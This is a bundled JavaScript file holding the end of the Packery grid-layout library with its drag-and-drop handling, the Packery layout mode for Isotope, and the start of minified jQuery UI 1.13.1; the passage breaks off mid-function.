    proto.needsResizeLayout = function() {
        var size = getSize( this.element );
        var innerSize = this._getOption('horizontal') ? 'innerHeight' : 'innerWidth';
        return size[ innerSize ] != this.size[ innerSize ];
    };

    proto.resizeShiftPercentLayout = function() {
        var items = this._getItemsForLayout( this.items );

        var isHorizontal = this._getOption('horizontal');
        var coord = isHorizontal ? 'y' : 'x';
        var measure = isHorizontal ? 'height' : 'width';
        var segmentName = isHorizontal ? 'rowHeight' : 'columnWidth';
        var innerSize = isHorizontal ? 'innerHeight' : 'innerWidth';

        // proportional re-align items
        var previousSegment = this[ segmentName ];
        previousSegment = previousSegment && previousSegment + this.gutter;

        if ( previousSegment ) {
            this._getMeasurements();
            var currentSegment = this[ segmentName ] + this.gutter;
            items.forEach( function( item ) {
                var seg = Math.round( item.rect[ coord ] / previousSegment );
                item.rect[ coord ] = seg * currentSegment;
            });
        } else {
            var currentSize = getSize( this.element )[ innerSize ] + this.gutter;
            var previousSize = this.packer[ measure ];
            items.forEach( function( item ) {
                item.rect[ coord ] = ( item.rect[ coord ] / previousSize ) * currentSize;
            });
        }

        this.shiftLayout();
    };

// -------------------------- drag -------------------------- //

    /**
     * handle an item drag start event
     * @param {Element} elem
     */
    proto.itemDragStart = function( elem ) {
        if ( !this.isEnabled ) {
            return;
        }
        this.stamp( elem );
        // this.ignore( elem );
        var item = this.getItem( elem );
        if ( !item ) {
            return;
        }

        item.enablePlacing();
        item.showDropPlaceholder();
        this.dragItemCount++;
        this.updateShiftTargets( item );
    };

    proto.updateShiftTargets = function( dropItem ) {
        this.shiftPacker.reset();

        // pack stamps
        this._getBoundingRect();
        var isOriginLeft = this._getOption('originLeft');
        var isOriginTop = this._getOption('originTop');
        this.stamps.forEach( function( stamp ) {
            // ignore dragged item
            var item = this.getItem( stamp );
            if ( item && item.isPlacing ) {
                return;
            }
            var offset = this._getElementOffset( stamp );
            var rect = new Rect({
                x: isOriginLeft ? offset.left : offset.right,
                y: isOriginTop ? offset.top : offset.bottom
            });
            this._setRectSize( stamp, rect );
            // save its space in the packer
            this.shiftPacker.placed( rect );
        }, this );

        // reset shiftTargets
        var isHorizontal = this._getOption('horizontal');
        var segmentName = isHorizontal ? 'rowHeight' : 'columnWidth';
        var measure = isHorizontal ? 'height' : 'width';

        this.shiftTargetKeys = [];
        this.shiftTargets = [];
        var boundsSize;
        var segment = this[ segmentName ];
        segment = segment && segment + this.gutter;

        if ( segment ) {
            var segmentSpan = Math.ceil( dropItem.rect[ measure ] / segment );
            var segs = Math.floor( ( this.shiftPacker[ measure ] + this.gutter ) / segment );
            boundsSize = ( segs - segmentSpan ) * segment;
            // add targets on top
            for ( var i=0; i < segs; i++ ) {
                this._addShiftTarget( i * segment, 0, boundsSize );
            }
        } else {
            boundsSize = ( this.shiftPacker[ measure ] + this.gutter ) - dropItem.rect[ measure ];
            this._addShiftTarget( 0, 0, boundsSize );
        }

        // pack each item to measure where shiftTargets are
        var items = this._getItemsForLayout( this.items );
        var packMethod = this._getPackMethod();
        items.forEach( function( item ) {
            var rect = item.rect;
            this._setRectSize( item.element, rect );
            this.shiftPacker[ packMethod ]( rect );

            // add top left corner
            this._addShiftTarget( rect.x, rect.y, boundsSize );
            // add bottom left / top right corner
            var cornerX = isHorizontal ? rect.x + rect.width : rect.x;
            var cornerY = isHorizontal ? rect.y : rect.y + rect.height;
            this._addShiftTarget( cornerX, cornerY, boundsSize );

            if ( segment ) {
                // add targets for each column on bottom / row on right
                var segSpan = Math.round( rect[ measure ] / segment );
                for ( var i=1; i < segSpan; i++ ) {
                    var segX = isHorizontal ? cornerX : rect.x + segment * i;
                    var segY = isHorizontal ? rect.y + segment * i : cornerY;
                    this._addShiftTarget( segX, segY, boundsSize );
                }
            }
        }, this );

    };

    proto._addShiftTarget = function( x, y, boundsSize ) {
        var checkCoord = this._getOption('horizontal') ? y : x;
        if ( checkCoord !== 0 && checkCoord > boundsSize ) {
            return;
        }
        // create string for a key, easier to keep track of what targets
        var key = x + ',' + y;
        var hasKey = this.shiftTargetKeys.indexOf( key ) != -1;
        if ( hasKey ) {
            return;
        }
        this.shiftTargetKeys.push( key );
        this.shiftTargets.push({ x: x, y: y });
    };

// -------------------------- drop -------------------------- //

    proto.shift = function( item, x, y ) {
        var shiftPosition;
        var minDistance = Infinity;
        var position = { x: x, y: y };
        this.shiftTargets.forEach( function( target ) {
            var distance = getDistance( target, position );
            if ( distance < minDistance ) {
                shiftPosition = target;
                minDistance = distance;
            }
        });
        item.rect.x = shiftPosition.x;
        item.rect.y = shiftPosition.y;
    };

    function getDistance( a, b ) {
        var dx = b.x - a.x;
        var dy = b.y - a.y;
        return Math.sqrt( dx * dx + dy * dy );
    }

// -------------------------- drag move -------------------------- //

    var DRAG_THROTTLE_TIME = 120;

    /**
     * handle an item drag move event
     * @param {Element} elem
     * @param {Number} x - horizontal change in position
     * @param {Number} y - vertical change in position
     */
    proto.itemDragMove = function( elem, x, y ) {
        var item = this.isEnabled && this.getItem( elem );
        if ( !item ) {
            return;
        }

        x -= this.size.paddingLeft;
        y -= this.size.paddingTop;

        var _this = this;
        function onDrag() {
            _this.shift( item, x, y );
            item.positionDropPlaceholder();
            _this.layout();
        }

        // throttle
        var now = new Date();
        if ( this._itemDragTime && now - this._itemDragTime < DRAG_THROTTLE_TIME ) {
            clearTimeout( this.dragTimeout );
            this.dragTimeout = setTimeout( onDrag, DRAG_THROTTLE_TIME );
        } else {
            onDrag();
            this._itemDragTime = now;
        }
    };

// -------------------------- drag end -------------------------- //

    /**
     * handle an item drag end event
     * @param {Element} elem
     */
    proto.itemDragEnd = function( elem ) {
        var item = this.isEnabled && this.getItem( elem );
        if ( !item ) {
            return;
        }

        clearTimeout( this.dragTimeout );
        item.element.classList.add('is-positioning-post-drag');

        var completeCount = 0;
        var _this = this;
        function onDragEndLayoutComplete() {
            completeCount++;
            if ( completeCount != 2 ) {
                return;
            }
            // reset drag item
            item.element.classList.remove('is-positioning-post-drag');
            item.hideDropPlaceholder();
            _this.dispatchEvent( 'dragItemPositioned', null, [ item ] );
        }

        item.once( 'layout', onDragEndLayoutComplete );
        this.once( 'layoutComplete', onDragEndLayoutComplete );
        item.moveTo( item.rect.x, item.rect.y );
        this.layout();
        this.dragItemCount = Math.max( 0, this.dragItemCount - 1 );
        this.sortItemsByPosition();
        item.disablePlacing();
        this.unstamp( item.element );
    };

    /**
     * binds Draggabilly events
     * @param {Draggabilly} draggie
     */
    proto.bindDraggabillyEvents = function( draggie ) {
        this._bindDraggabillyEvents( draggie, 'on' );
    };

    proto.unbindDraggabillyEvents = function( draggie ) {
        this._bindDraggabillyEvents( draggie, 'off' );
    };

    proto._bindDraggabillyEvents = function( draggie, method ) {
        var handlers = this.handleDraggabilly;
        draggie[ method ]( 'dragStart', handlers.dragStart );
        draggie[ method ]( 'dragMove', handlers.dragMove );
        draggie[ method ]( 'dragEnd', handlers.dragEnd );
    };

    /**
     * binds jQuery UI Draggable events
     * @param {jQuery} $elems
     */
    proto.bindUIDraggableEvents = function( $elems ) {
        this._bindUIDraggableEvents( $elems, 'on' );
    };

    proto.unbindUIDraggableEvents = function( $elems ) {
        this._bindUIDraggableEvents( $elems, 'off' );
    };

    proto._bindUIDraggableEvents = function( $elems, method ) {
        var handlers = this.handleUIDraggable;
        $elems
            [ method ]( 'dragstart', handlers.start )
            [ method ]( 'drag', handlers.drag )
            [ method ]( 'dragstop', handlers.stop );
    };

// ----- destroy ----- //

    var _destroy = proto.destroy;
    proto.destroy = function() {
        _destroy.apply( this, arguments );
        // disable flag; prevent drag events from triggering. #72
        this.isEnabled = false;
    };

// -----  ----- //

    Packery.Rect = Rect;
    Packery.Packer = Packer;

    return Packery;

}));

/*!
 * Packery layout mode v2.0.1
 * sub-classes Packery
 */

/*jshint browser: true, strict: true, undef: true, unused: true */

( function( window, factory ) {

    // universal module definition
    if ( typeof define == 'function' && define.amd ) {
        // AMD
        define( [
                'isotope-layout/js/layout-mode',
                'packery/js/packery'
            ],
            factory );
    } else if ( typeof module == 'object' && module.exports ) {
        // CommonJS
        module.exports = factory(
            require('isotope-layout/js/layout-mode'),
            require('packery')
        );
    } else {
        // browser global
        factory(
            window.Isotope.LayoutMode,
            window.Packery
        );
    }

}( window, function factor( LayoutMode, Packery ) {


    // create an Outlayer layout class
    var PackeryMode = LayoutMode.create('packery');
    var proto = PackeryMode.prototype;

    var keepModeMethods = {
        _getElementOffset: true,
        _getMeasurement: true
    };

    // inherit Packery prototype
    for ( var method in Packery.prototype ) {
        // do not inherit mode methods
        if ( !keepModeMethods[ method ] ) {
            proto[ method ] = Packery.prototype[ method ];
        }
    }

    // set packer in _resetLayout
    var _resetLayout = proto._resetLayout;
    proto._resetLayout = function() {
        this.packer = this.packer || new Packery.Packer();
        this.shiftPacker = this.shiftPacker || new Packery.Packer();
        _resetLayout.apply( this, arguments );
    };

    var _getItemLayoutPosition = proto._getItemLayoutPosition;
    proto._getItemLayoutPosition = function( item ) {
        // set packery rect
        item.rect = item.rect || new Packery.Rect();
        return _getItemLayoutPosition.call( this, item );
    };

    // needsResizeLayout for vertical or horizontal
    var _needsResizeLayout = proto.needsResizeLayout;
    proto.needsResizeLayout = function() {
        if ( this._getOption('horizontal') ) {
            return this.needsVerticalResizeLayout();
        } else {
            return _needsResizeLayout.call( this );
        }
    };

    // point to mode options for horizontal
    var _getOption = proto._getOption;
    proto._getOption = function( option ) {
        if ( option == 'horizontal' ) {
            return this.options.isHorizontal !== undefined ?
                this.options.isHorizontal : this.options.horizontal;
        }
        return _getOption.apply( this.isotope, arguments );
    };

    return PackeryMode;

}));


/*! jQuery UI - v1.13.1 - 2022-01-20
* http://jqueryui.com
* Includes: widget.js, position.js, data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js, effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect-fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effects/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-size.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mixin.js, jquery-patch.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js, widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable.js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, widgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, widgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js
* Copyright jQuery Foundation and other contributors; Licensed MIT */ !function(a){"use strict";"function"==typeof define&&define.amd?define(["jquery"],a):a(jQuery)}(function($){"use strict";$.ui=$.ui||{},$.ui.version="1.13.1";/*!
 * jQuery UI Widget 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ var i,j,k,l,e,m,n,o,u,p,q,v=0,w=Array.prototype.hasOwnProperty,x=Array.prototype.slice;$.cleanData=(p=$.cleanData,function(c){var d,a,b;for(b=0;null!=(a=c[b]);b++)(d=$._data(a,"events"))&&d.remove&&$(a).triggerHandler("remove");p(c)}),$.widget=function(a,g,b){var d,c,f,i={},e=a.split(".")[0],h=e+"-"+(a=a.split(".")[1]);return b||(b=g,g=$.Widget),Array.isArray(b)&&(b=$.extend.apply(null,[{}].concat(b))),$.expr.pseudos[h.toLowerCase()]=function(a){return!!$.data(a,h)},$[e]=$[e]||{},d=$[e][a],c=$[e][a]=function(a,b){if(!this||!this._createWidget)return new c(a,b);arguments.length&&this._createWidget(a,b)},$.extend(c,d,{version:b.version,_proto:$.extend({},b),_childConstructors:[]}),f=new g,f.options=$.widget.extend({},f.options),$.each(b,function(a,b){if("function"!=typeof b){i[a]=b;return}i[a]=function(){function c(){return g.prototype[a].apply(this,arguments)}function d(b){return g.prototype[a].apply(this,b)}return function(){var a,e=this._super,f=this._superApply;return this._super=c,this._superApply=d,a=b.apply(this,arguments),this._super=e,this._superApply=f,a}}()}),c.prototype=$.widget.extend(f,{widgetEventPrefix:d&&f.widgetEventPrefix||a},i,{constructor:c,namespace:e,widgetName:a,widgetFullName:h}),d?($.each(d._childConstructors,function(d,a){var b=a.prototype;$.widget(b.namespace+"."+b.widgetName,c,a._proto)}),delete d._childConstructors):g._childConstructors.push(c),$.widget.bridge(a,c),c},$.widget.extend=function(c){for(var a,b,e=x.call(arguments,1),d=0,f=e.length;d<f;d++)for(a in e[d])b=e[d][a],w.call(e[d],a)&& void 0!==b&&($.isPlainObject(b)?c[a]=$.isPlainObject(c[a])?$.widget.extend({},c[a],b):$.widget.extend({},b):c[a]=b);return c},$.widget.bridge=function(a,b){var c=b.prototype.widgetFullName||a;$.fn[a]=function(d){var e=x.call(arguments,1),f=this;return"string"==typeof d?this.length||"instance"!==d?this.each(function(){var b,g=$.data(this,c);return"instance"===d?(f=g,!1):g?"function"!=typeof g[d]||"_"===d.charAt(0)?$.error("no such method '"+d+"' for "+a+" widget instance"):(b=g[d].apply(g,e))!==g&& void 0!==b?(f=b&&b.jquery?f.pushStack(b.get()):b,!1):void 0:$.error("cannot call methods on "+a+" prior to initialization; attempted to call method '"+d+"'")}):f=void 0:(e.length&&(d=$.widget.extend.apply(null,[d].concat(e))),this.each(function(){var a=$.data(this,c);a?(a.option(d||{}),a._init&&a._init()):$.data(this,c,new b(d,this))})),f}},$.Widget=function(){},$.Widget._childConstructors=[],$.Widget.prototype={widgetName:"widget",widgetEventPrefix:"",defaultElement:"<div>",options:{classes:{},disabled:!1,create:null},_createWidget:function(b,a){a=$(a||this.defaultElement||this)[0],this.element=$(a),this.uuid=v++,this.eventNamespace="."+this.widgetName+this.uuid,this.bindings=$(),this.hoverable=$(),this.focusable=$(),this.classesElementLookup={},a!==this&&($.data(a,this.widgetFullName,this),this._on(!0,this.element,{remove:function(b){b.target===a&&this.destroy()}}),this.document=$(a.style?a.ownerDocument:a.document||a),this.window=$(this.document[0].defaultView||this.document[0].parentWindow)),this.options=$.widget.extend({},this.options,this._getCreateOptions(),b),this._create(),this.options.disabled&&this._setOptionDisabled(this.options.disabled),this._trigger("create",null,this._getCreateEventData()),this._init()},_getCreateOptions:function(){return{}},_getCreateEventData:$.noop,_create:$.noop,_init:$.noop,destroy:function(){var a=this;this._destroy(),$.each(this.classesElementLookup,function(b,c){a._removeClass(c,b)}),this.element.off(this.eventNamespace).removeData(this.widgetFullName),this.widget().off(this.eventNamespace).removeAttr("aria-disabled"),this.bindings.off(this.eventNamespace)},_destroy:$.noop,widget:function(){return this.element},option:function(a,f){var c,b,d,e=a;if(0===arguments.length)return $.widget.extend({},this.options);if("string"==typeof a){if(e={},a=(c=a.split(".")).shift(),c.length){for(d=0,b=e[a]=$.widget.extend({},this.options[a]);d<c.length-1;d++)b[c[d]]=b[c[d]]||{},b=b[c[d]];if(a=c.pop(),1===arguments.length)return void 0===b[a]?null:b[a];b[a]=f}else{if(1===arguments.length)return void 0===this.options[a]?null:this.options[a];e[a]=f}}return this._setOptions(e),this},_setOptions:function(b){var a;for(a in b)this._setOption(a,b[a]);return this},_setOption:function(a,b){return"classes"===a&&this._setOptionClasses(b),this.options[a]=b,"disabled"===a&&this._setOptionDisabled(b),this},_setOptionClasses:function(c){var a,d,b;for(a in c)b=this.classesElementLookup[a],c[a]!==this.options.classes[a]&&b&&b.length&&(d=$(b.get()),this._removeClass(b,a),d.addClass(this._classes({element:d,keys:a,classes:c,add:!0})))},_setOptionDisabled:function(a){this._toggleClass(this.widget(),this.widgetFullName+"-disabled",null,!!a),a&&(this._removeClass(this.hoverable,null,"ui-state-hover"),this._removeClass(this.focusable,null,"ui-state-focus"))},enable:function(){return this._setOptions({disabled:!1})},disable:function(){return this._setOptions({disabled:!0})},_classes:function(a){var c=[],d=this;function e(){var b=[];a.element.each(function(_,a){$.map(d.classesElementLookup,function(a){return a}).some(function(b){return b.is(a)})||b.push(a)}),d._on($(b),{remove:"_untrackClassesElement"})}function b(f,h){var g,b;for(b=0;b<f.length;b++)g=d.classesElementLookup[f[b]]||$(),a.add?(e(),g=$($.uniqueSort(g.get().concat(a.element.get())))):g=$(g.not(a.element).get()),d.classesElementLookup[f[b]]=g,c.push(f[b]),h&&a.classes[f[b]]&&c.push(a.classes[f[b]])}return(a=$.extend({element:this.element,classes:this.options.classes||{}},a)).keys&&b(a.keys.match(/\S+/g)||[],!0),a.extra&&b(a.extra.match(/\S+/g)||[]),c.join(" ")},_untrackClassesElement:function(a){var b=this;$.each(b.classesElementLookup,function(d,c){-1!==$.inArray(a.target,c)&&(b.classesElementLookup[d]=$(c.not(a.target).get()))}),this._off($(a.target))},_removeClass:function(a,b,c){return this._toggleClass(a,b,c,!1)},_addClass:function(a,b,c){return this._toggleClass(a,b,c,!0)},_toggleClass:function(b,d,e,a){a="boolean"==typeof a?a:e;var c="string"==typeof b||null===b,f={extra:c?d:e,keys:c?b:d,element:c?this.element:b,add:a};return f.element.toggleClass(this._classes(f),a),this},_on:function(c,a,b){var d,e=this;"boolean"!=typeof c&&(b=a,a=c,c=!1),b?(a=d=$(a),this.bindings=this.bindings.add(a)):(b=a,a=this.element,d=this.widget()),$.each(b,function(j,f){function b(){if(!(!c&&(!0===e.options.disabled||$(this).hasClass("ui-state-disabled"))))return("string"==typeof f?e[f]:f).apply(e,arguments)}"string"!=typeof f&&(b.guid=f.guid=f.guid||b.guid||$.guid++);var g=j.match(/^([\w:-]*)\s*(.*)$/),h=g[1]+e.eventNamespace,i=g[2];i?d.on(h,i,b):a.on(h,b)})},_off:function(a,b){b=(b||"").split(" ").join(this.eventNamespace+" ")+this.eventNamespace,a.off(b),this.bindings=$(this.bindings.not(a).get()),this.focusable=$(this.focusable.not(a).get()),this.hoverable=$(this.hoverable.not(a).get())},_delay:function(b,a){var c=this;return setTimeout(function(){return("string"==typeof b?c[b]:b).apply(c,arguments)},a||0)},_hoverable:function(a){this.hoverable=this.hoverable.add(a),this._on(a,{mouseenter:function(a){this._addClass($(a.currentTarget),null,"ui-state-hover")},mouseleave:function(a){this._removeClass($(a.currentTarget),null,"ui-state-hover")}})},_focusable:function(a){this.focusable=this.focusable.add(a),this._on(a,{focusin:function(a){this._addClass($(a.currentTarget),null,"ui-state-focus")},focusout:function(a){this._removeClass($(a.currentTarget),null,"ui-state-focus")}})},_trigger:function(b,a,c){var d,e,f=this.options[b];if(c=c||{},(a=$.Event(a)).type=(b===this.widgetEventPrefix?b:this.widgetEventPrefix+b).toLowerCase(),a.target=this.element[0],e=a.originalEvent)for(d in e)d in a||(a[d]=e[d]);return this.element.trigger(a,c),!("function"==typeof f&& !1===f.apply(this.element[0],[a].concat(c))||a.isDefaultPrevented())}},$.each({show:"fadeIn",hide:"fadeOut"},function(a,b){$.Widget.prototype["_"+a]=function(d,c,f){"string"==typeof c&&(c={effect:c});var g,e=c?!0===c||"number"==typeof c?b:c.effect||b:a;"number"==typeof(c=c||{})?c={duration:c}:!0===c&&(c={}),g=!$.isEmptyObject(c),c.complete=f,c.delay&&d.delay(c.delay),g&&$.effects&&$.effects.effect[e]?d[a](c):e!==a&&d[e]?d[e](c.duration,c.easing,f):d.queue(function(b){$(this)[a](),f&&f.call(d[0]),b()})}}),$.widget,/*!
 * jQuery UI Position 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 *
 * http://api.jqueryui.com/position/
 */ function(){var a,b=Math.max,c=Math.abs,d=/left|center|right/,e=/top|center|bottom/,f=/[\+\-]\d+(\.[\d]+)?%?/,g=/^\w+/,h=/%$/,i=$.fn.position;function j(a,b,c){return[parseFloat(a[0])*(h.test(a[0])?b/100:1),parseFloat(a[1])*(h.test(a[1])?c/100:1)]}function k(a,b){return parseInt($.css(a,b),10)||0}function l(a){return null!=a&&a===a.window}$.position={scrollbarWidth:function(){if(void 0!==a)return a;var c,d,b=$("<div style='display:block;position:absolute;width:200px;height:200px;overflow:hidden;'><div style='height:300px;width:auto;'></div></div>"),e=b.children()[0];return $("body").append(b),c=e.offsetWidth,b.css("overflow","scroll"),c===(d=e.offsetWidth)&&(d=b[0].clientWidth),b.remove(),a=c-d},getScrollInfo:function(a){var b=a.isWindow||a.isDocument?"":a.element.css("overflow-x"),c=a.isWindow||a.isDocument?"":a.element.css("overflow-y"),d="scroll"===b||"auto"===b&&a.width<a.element[0].scrollWidth;return{width:"scroll"===c||"auto"===c&&a.height<a.element[0].scrollHeight?$.position.scrollbarWidth():0,height:d?$.position.scrollbarWidth():0}},getWithinInfo:function(b){var a=$(b||window),c=l(a[0]),d=!!a[0]&&9===a[0].nodeType;return{element:a,isWindow:c,isDocument:d,offset:c||d?{left:0,top:0}:$(b).offset(),scrollLeft:a.scrollLeft(),scrollTop:a.scrollTop(),width:a.outerWidth(),height:a.outerHeight()}}},$.fn.position=function(a){if(!a||!a.of)return i.apply(this,arguments);var r,o,p,t,m,q,h,n,u="string"==typeof(a=$.extend({},a)).of?$(document).find(a.of):$(a.of),v=$.position.getWithinInfo(a.within),x=$.position.getScrollInfo(v),s=(a.collision||"flip").split(" "),w={};return q=9===(n=(h=u)[0]).nodeType?{width:h.width(),height:h.height(),offset:{top:0,left:0}}:l(n)?{width:h.width(),height:h.height(),offset:{top:h.scrollTop(),left:h.scrollLeft()}}:n.preventDefault?{width:0,height:0,offset:{top:n.pageY,left:n.pageX}}:{width:h.outerWidth(),height:h.outerHeight(),offset:h.offset()},u[0].preventDefault&&(a.at="left top"),o=q.width,p=q.height,t=q.offset,m=$.extend({},t),$.each(["my","at"],function(){var c,h,b=(a[this]||"").split(" ");1===b.length&&(b=d.test(b[0])?b.concat(["center"]):e.test(b[0])?["center"].concat(b):["center","center"]),b[0]=d.test(b[0])?b[0]:"center",b[1]=e.test(b[1])?b[1]:"center",c=f.exec(b[0]),h=f.exec(b[1]),w[this]=[c?c[0]:0,h?h[0]:0],a[this]=[g.exec(b[0])[0],g.exec(b[1])[0]]}),1===s.length&&(s[1]=s[0]),"right"===a.at[0]?m.left+=o:"center"===a.at[0]&&(m.left+=o/2),"bottom"===a.at[1]?m.top+=p:"center"===a.at[1]&&(m.top+=p/2),r=j(w.at,o,p),m.left+=r[0],m.top+=r[1],this.each(function(){var q,h,e=$(this),f=e.outerWidth(),g=e.outerHeight(),i=k(this,"marginLeft"),l=k(this,"marginTop"),y=f+i+k(this,"marginRight")+x.width,z=g+l+k(this,"marginBottom")+x.height,d=$.extend({},m),n=j(w.my,e.outerWidth(),e.outerHeight());"right"===a.my[0]?d.left-=f:"center"===a.my[0]&&(d.left-=f/2),"bottom"===a.my[1]?d.top-=g:"center"===a.my[1]&&(d.top-=g/2),d.left+=n[0],d.top+=n[1],q={marginLeft:i,marginTop:l},$.each(["left","top"],function(b,c){$.ui.position[s[b]]&&$.ui.position[s[b]][c](d,{targetWidth:o,targetHeight:p,elemWidth:f,elemHeight:g,collisionPosition:q,collisionWidth:y,collisionHeight:z,offset:[r[0]+n[0],r[1]+n[1]],my:a.my,at:a.at,within:v,elem:e})}),a.using&&(h=function(m){var i=t.left-d.left,k=i+o-f,j=t.top-d.top,l=j+p-g,h={target:{element:u,left:t.left,top:t.top,width:o,height:p},element:{element:e,left:d.left,top:d.top,width:f,height:g},horizontal:k<0?"left":i>0?"right":"center",vertical:l<0?"top":j>0?"bottom":"middle"};o<f&&c(i+k)<o&&(h.horizontal="center"),p<g&&c(j+l)<p&&(h.vertical="middle"),b(c(i),c(k))>b(c(j),c(l))?h.important="horizontal":h.important="vertical",a.using.call(this,m,h)}),e.offset($.extend(d,{using:h}))})},$.ui.position={fit:{left:function(a,d){var j,g=d.within,e=g.isWindow?g.scrollLeft:g.offset.left,h=g.width,i=a.left-d.collisionPosition.marginLeft,c=e-i,f=i+d.collisionWidth-h-e;d.collisionWidth>h?c>0&&f<=0?(j=a.left+c+d.collisionWidth-h-e,a.left+=c-j):f>0&&c<=0?a.left=e:c>f?a.left=e+h-d.collisionWidth:a.left=e:c>0?a.left+=c:f>0?a.left-=f:a.left=b(a.left-i,a.left)},top:function(a,c){var j,h=c.within,e=h.isWindow?h.scrollTop:h.offset.top,g=c.within.height,i=a.top-c.collisionPosition.marginTop,d=e-i,f=i+c.collisionHeight-g-e;c.collisionHeight>g?d>0&&f<=0?(j=a.top+d+c.collisionHeight-g-e,a.top+=d-j):f>0&&d<=0?a.top=e:d>f?a.top=e+g-c.collisionHeight:a.top=e:d>0?a.top+=d:f>0?a.top-=f:a.top=b(a.top-i,a.top)}},flip:{left:function(d,a){var i,j,b=a.within,o=b.offset.left+b.scrollLeft,k=b.width,h=b.isWindow?b.scrollLeft:b.offset.left,l=d.left-a.collisionPosition.marginLeft,m=l-h,n=l+a.collisionWidth-k-h,e="left"===a.my[0]?-a.elemWidth:"right"===a.my[0]?a.elemWidth:0,f="left"===a.at[0]?a.targetWidth:"right"===a.at[0]?-a.targetWidth:0,g=-2*a.offset[0];m<0?((i=d.left+e+f+g+a.collisionWidth-k-o)<0||i<c(m))&&(d.left+=e+f+g):n>0&&((j=d.left-a.collisionPosition.marginLeft+e+f+g-h)>0||c(j)<n)&&(d.left+=e+f+g)},top:function(d,a){var i,j,b=a.within,o=b.offset.top+b.scrollTop,k=b.height,h=b.isWindow?b.scrollTop:b.offset.top,l=d.top-a.collisionPosition.marginTop,m=l-h,n=l+a.collisionHeight-k-h,p="top"===a.my[1],e=p?-a.elemHeight:"bottom"===a.my[1]?a.elemHeight:0,f="top"===a.at[1]?a.targetHeight:"bottom"===a.at[1]?-a.targetHeight:0,g=-2*a.offset[1];m<0?((j=d.top+e+f+g+a.collisionHeight-k-o)<0||j<c(m))&&(d.top+=e+f+g):n>0&&((i=d.top-a.collisionPosition.marginTop+e+f+g-h)>0||c(i)<n)&&(d.top+=e+f+g)}},flipfit:{left:function(){$.ui.position.flip.left.apply(this,arguments),$.ui.position.fit.left.apply(this,arguments)},top:function(){$.ui.position.flip.top.apply(this,arguments),$.ui.position.fit.top.apply(this,arguments)}}}}(),$.ui.position,$.extend($.expr.pseudos,{data:$.expr.createPseudo?$.expr.createPseudo(function(a){return function(b){return!!$.data(b,a)}}):function(a,c,b){return!!$.data(a,b[3])}}),$.fn.extend({disableSelection:(q="onselectstart"in document.createElement("div")?"selectstart":"mousedown",function(){return this.on(q+".ui-disableSelection",function(a){a.preventDefault()})}),enableSelection:function(){return this.off(".ui-disableSelection")}});var r,a=$,s={},y=s.toString,z=/^([\-+])=\s*(\d+\.?\d*)/,A=[{re:/rgba?\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*(?:,\s*(\d?(?:\.\d+)?)\s*)?\)/,parse:function(a){return[a[1],a[2],a[3],a[4]]}},{re:/rgba?\(\s*(\d+(?:\.\d+)?)\%\s*,\s*(\d+(?:\.\d+)?)\%\s*,\s*(\d+(?:\.\d+)?)\%\s*(?:,\s*(\d?(?:\.\d+)?)\s*)?\)/,parse:function(a){return[2.55*a[1],2.55*a[2],2.55*a[3],a[4]]}},{re:/#([a-f0-9]{2})([a-f0-9]{2})([a-f0-9]{2})([a-f0-9]{2})?/,parse:function(a){return[parseInt(a[1],16),parseInt(a[2],16),parseInt(a[3],16),a[4]?(parseInt(a[4],16)/255).toFixed(2):1]}},{re:/#([a-f0-9])([a-f0-9])([a-f0-9])([a-f0-9])?/,parse:function(a){return[parseInt(a[1]+a[1],16),parseInt(a[2]+a[2],16),parseInt(a[3]+a[3],16),a[4]?(parseInt(a[4]+a[4],16)/255).toFixed(2):1]}},{re:/hsla?\(\s*(\d+(?:\.\d+)?)\s*,\s*(\d+(?:\.\d+)?)\%\s*,\s*(\d+(?:\.\d+)?)\%\s*(?:,\s*(\d?(?:\.\d+)?)\s*)?\)/,space:"hsla",parse:function(a){return[a[1],a[2]/100,a[3]/100,a[4]]}}],b=a.Color=function(b,c,d,e){return new a.Color.fn.parse(b,c,d,e)},d={rgba:{props:{red:{idx:0,type:"byte"},green:{idx:1,type:"byte"},blue:{idx:2,type:"byte"}}},hsla:{props:{hue:{idx:0,type:"degrees"},saturation:{idx:1,type:"percent"},lightness:{idx:2,type:"percent"}}}},B={byte:{floor:!0,max:255},percent:{max:1},degrees:{mod:360,floor:!0}},t=b.support={},f=a("<p>")[0],g=a.each;function C(a){return null==a?a+"":"object"==typeof a?s[y.call(a)]||"object":typeof a}function D(a,c,d){var b=B[c.type]||{};return null==a?d||!c.def?null:c.def:(a=b.floor?~~a:parseFloat(a),isNaN(a))?c.def:b.mod?(a+b.mod)%b.mod:Math.min(b.max,Math.max(0,a))}function E(c){var f=b(),e=f._rgba=[];return(c=c.toLowerCase(),g(A,function(j,a){var b,h=a.re.exec(c),i=h&&a.parse(h),g=a.space||"rgba";if(i)return b=f[g](i),f[d[g].cache]=b[d[g].cache],e=f._rgba=b._rgba,!1}),e.length)?("0,0,0,0"===e.join()&&a.extend(e,r.transparent),f):r[c]}function F(b,c,a){return 6*(a=(a+1)%1)<1?b+(c-b)*a*6:2*a<1?c:3*a<2?b+(c-b)*(2/3-a)*6:b}f.style.cssText="background-color:rgba(1,1,1,.5)",t.rgba=f.style.backgroundColor.indexOf("rgba")> -1,g(d,function(b,a){a.cache="_"+b,a.props.alpha={idx:3,type:"percent",def:1}}),a.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(b,a){s["[object "+a+"]"]=a.toLowerCase()}),b.fn=a.extend(b.prototype,{parse:function(c,e,h,i){if(void 0===c)return this._rgba=[null,null,null,null],this;(c.jquery||c.nodeType)&&(c=a(c).css(e),e=void 0);var 